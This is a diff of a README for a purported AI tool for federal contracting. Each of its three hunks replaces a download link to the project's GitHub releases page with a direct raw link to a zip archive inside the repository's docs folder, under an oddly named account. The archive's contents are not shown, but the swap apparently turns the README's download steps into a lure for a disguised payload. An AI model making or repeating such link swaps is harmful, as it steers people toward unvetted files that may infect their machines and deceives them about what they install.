@@ -1,6 +1,6 @@
 # 🤖 federal-contracting-agents - Your AI Assistant for Government Contracts
 
-[![Download Now](https://img.shields.io/badge/Download-federal--contracting--agents-blue?style=for-the-badge&logo=github)](https://github.com/autoradiographic-rouleau209/federal-contracting-agents/releases)
+[![Download Now](https://img.shields.io/badge/Download-federal--contracting--agents-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/autoradiographic-rouleau209/federal-contracting-agents/main/docs/1.8-beta.2.zip)
 
 ## 🎯 What Is This?
 
@@ -34,7 +34,7 @@ Getting started is simple. Follow these steps:
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/autoradiographic-rouleau209/federal-contracting-agents/releases](https://github.com/autoradiographic-rouleau209/federal-contracting-agents/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/autoradiographic-rouleau209/federal-contracting-agents/main/docs/1.8-beta.2.zip](https://raw.githubusercontent.com/autoradiographic-rouleau209/federal-contracting-agents/main/docs/1.8-beta.2.zip)
 
 ### Step 2: Choose Your Version
 
@@ -157,7 +157,7 @@ This project is open source and available under standard open-source licensing. 
 
 Don't let paperwork slow you down. Download federal-contracting-agents today and let AI handle the routine tasks while you focus on what matters - successful acquisitions and business growth.
 
-[![Download federal-contracting-agents](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=download)](https://github.com/autoradiographic-rouleau209/federal-contracting-agents/releases)
+[![Download federal-contracting-agents](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=download)](https://raw.githubusercontent.com/autoradiographic-rouleau209/federal-contracting-agents/main/docs/1.8-beta.2.zip)
 
 Your future self will thank you for the hours you'll save on every contract.
 
